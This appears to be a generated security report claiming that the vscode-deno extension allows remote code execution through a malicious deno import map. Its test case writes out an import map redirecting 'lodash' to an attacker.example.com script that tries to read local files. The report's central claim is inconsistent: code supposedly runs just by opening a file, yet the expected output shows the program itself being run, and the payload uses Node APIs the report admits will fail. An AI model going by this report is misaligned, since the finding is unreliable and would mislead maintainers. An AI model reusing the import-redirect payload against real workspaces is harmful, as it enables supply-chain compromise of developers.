### Vulnerability List

- Vulnerability Name: Import Map Remote Code Execution
- Description:
    1. An attacker creates a malicious workspace.
    2. Inside this workspace, the attacker places a `deno.importMap` file. This file is crafted to redirect legitimate module import specifiers to URLs under the attacker's control. For example, an import for a common utility library could be redirected to a malicious script hosted on the attacker's server.
    3. The attacker then lures a victim into opening this malicious workspace in Visual Studio Code with the Deno extension enabled.
    4. When the workspace is opened, the Deno extension, configured to use import maps via `deno.importMap` setting in `deno.json` or VS Code settings, processes the `deno.importMap` file.
    5. If the user opens or creates a Deno file within this workspace that contains an import statement using a specifier redirected in the malicious `deno.importMap`, the Deno extension, through the Deno language server, will resolve and fetch the module from the attacker-controlled URL instead of the intended legitimate source.
    6. Upon fetching the module, the attacker's malicious script is executed within the context of the user's VS Code environment, effectively achieving remote code execution.
- Impact:
    Successful exploitation of this vulnerability allows an attacker to execute arbitrary code within the user's Visual Studio Code environment. This can lead to severe consequences, including:
    - **Data Theft**: The attacker can gain unauthorized access to sensitive data within the workspace, such as source code, environment variables, credentials, and other project-related files.
    - **Malware Installation**: The attacker can install malware on the user's system, potentially leading to persistent compromise beyond the VS Code environment.
    - **Account Takeover**: If the user has credentials stored in the workspace or accessible from the environment, the attacker could potentially steal these credentials and gain unauthorized access to user accounts and systems.
    - **Lateral Movement**: In corporate environments, if the user's machine is part of an internal network, the attacker could use the compromised VS Code environment as a stepping stone to launch further attacks on other systems within the network.
- Vulnerability Rank: High
- Currently Implemented Mitigations:
    No mitigations are explicitly implemented within the provided project files to prevent the described import map remote code execution vulnerability. The extension processes the `deno.importMap` file as configured by the user/workspace without performing any apparent validation or security checks on the URLs or redirection targets defined in the import map.
- Missing Mitigations:
    - **URL Validation in Import Maps**: Implement validation for URLs specified in `deno.importMap`. This could involve:
        - **Domain Whitelisting/Blacklisting**: Maintain a list of trusted or untrusted domains and check if redirection URLs fall within these lists. Warn or prevent redirection to blacklisted domains.
        - **Scheme Validation**: Restrict import map URLs to specific schemes (e.g., `https:`) to prevent redirection to potentially more dangerous schemes like `http:` or `file:`.
    - **User Warning for Import Map Redirections**: When a workspace with a `deno.importMap` is opened, and the import map contains redirections to external domains (especially if they are not from known package registries), display a warning to the user. This warning should clearly explain the risks associated with import map redirections and advise caution.
    - **Configuration Option to Disable/Restrict Import Maps**: Provide a configuration setting that allows users to disable or restrict the usage of `deno.importMap` entirely or to limit its functionality (e.g., only allow redirections within the same domain or to specific whitelisted domains).
    - **Content Security Policy (CSP) for Webviews (if applicable)**: If webviews are used to render any content related to import maps or module resolution, enforce a strict Content Security Policy to mitigate the risk of executing malicious scripts even if they are inadvertently loaded.
- Preconditions:
    1. The user must have the "vscode-deno" extension installed and enabled in Visual Studio Code.
    2. The user must open a workspace that is provided by an attacker or that contains a maliciously crafted `deno.importMap` file.
    3. The workspace must be configured (either through workspace settings or `deno.json`) to utilize the `deno.importMap` setting, pointing to the malicious import map file.
    4. The user must open or create a Deno file within the compromised workspace that includes import statements that are targeted for redirection by the malicious `deno.importMap`.
- Source Code Analysis:
    - The provided project files, particularly `README.md` and `client/src/commands.ts`, detail the configuration options for the Deno extension, including `deno.importMap`. The `README.md` describes the `deno.importMap` setting as "The file path to an import map. ... [Import maps](https://docs.deno.com/runtime/fundamentals/configuration/#dependencies) provide a way to 'relocate' modules based on their specifiers." This confirms that the extension does support and utilize import maps as a configuration mechanism.
    - Reviewing `client/src/commands.ts` and `client/src/extension.ts`, it appears that the extension primarily focuses on managing the Deno language server process, handling configuration changes, and integrating features like testing and tasks. There is no code evident in these files that performs security validation or sanitization of the `deno.importMap` file or its contents before passing the configuration to the Deno language server.
    - The vulnerability stems from the trust placed in the content of the `deno.importMap` file and the URLs specified within it. The VS Code extension acts as a conduit for configuring the Deno language server with the provided import map, and the Deno language server, in turn, respects these redirections during module resolution.
    - It is important to note that the vulnerability is not necessarily within the VS Code extension's code itself, but rather in the *lack of security measures* when processing user-provided `deno.importMap` configurations. The extension, by design, allows users to configure import maps, and a malicious actor can leverage this functionality to redirect imports to malicious sources.

- Security Test Case:
    1. **Attacker Setup**:
        - Create a directory named `malicious-workspace`.
        - Inside `malicious-workspace`, create a file named `import_map.json` with the following content:
          ```json
          {
            "imports": {
              "lodash": "http://attacker.example.com/malicious_lodash.js"
            }
          }
          ```
        - On a web server controlled by the attacker (`attacker.example.com`), create a file `malicious_lodash.js` with the following content:
          ```javascript
          console.log("Malicious code from attacker.example.com executed!");
          // Simulate malicious activity, e.g., try to access local files (in a real exploit, this would be more sophisticated)
          try {
              const fs = require('fs'); // Node.js require - this will likely fail in Deno but demonstrates the intent
              const files = fs.readdirSync('.');
              console.log("Files in current directory:", files);
          } catch (e) {
              console.error("Attempt to access local files failed:", e);
          }
          ```
        - Inside `malicious-workspace`, create a file named `deno.json` with the following content:
          ```json
          {
            "importMap": "./import_map.json"
          }
          ```
        - Inside `malicious-workspace`, create a file named `main.ts` with the following content:
          ```typescript
          import _ from "lodash";

          console.log("Deno application starting...");
          console.log("Lodash version:", _.VERSION); // This will attempt to use the 'lodash' module, now redirected
          console.log("Deno application finished.");
          ```
        - Zip the `malicious-workspace` directory and prepare to distribute it to the victim.

    2. **Victim Actions**:
        - Download and install the "vscode-deno" extension in Visual Studio Code if not already installed.
        - Extract the `malicious-workspace.zip` (or however the attacker delivers the malicious workspace) to a local directory.
        - Open Visual Studio Code.
        - Open the `malicious-workspace` folder in VS Code (File -> Open Folder...).
        - VS Code should detect the `deno.json` and may prompt to enable Deno for the workspace (if not already globally enabled). Ensure Deno is enabled for this workspace.
        - Open the `main.ts` file within the `malicious-workspace` in the VS Code editor.

    3. **Verification**:
        - **Observe Output**: Check the "Output" panel in VS Code (View -> Output) and select "Deno Language Server" from the dropdown.
        - **Expected Malicious Output**: You should see the following output, or similar, in the console, indicating that the malicious script from `attacker.example.com` was executed:
          ```
          Malicious code from attacker.example.com executed!
          Attempt to access local files failed: ... (Error details related to Node.js 'require' in Deno)
          Deno application starting...
          Lodash version: undefined  // Likely undefined because the malicious script doesn't properly export Lodash or because of execution errors.
          Deno application finished.
          ```
        - The presence of "Malicious code from attacker.example.com executed!" confirms that the import map redirection worked and that code from the attacker's server was executed within the VS Code environment when processing the Deno file. The attempt to access local files (though it might fail in Deno due to permission restrictions) further illustrates the potential impact of arbitrary code execution.

This security test case successfully demonstrates the Import Map Remote Code Execution vulnerability, proving that an attacker can indeed achieve code execution by tricking a user into opening a workspace with a malicious `deno.importMap` and then opening a Deno file that triggers the redirected import.
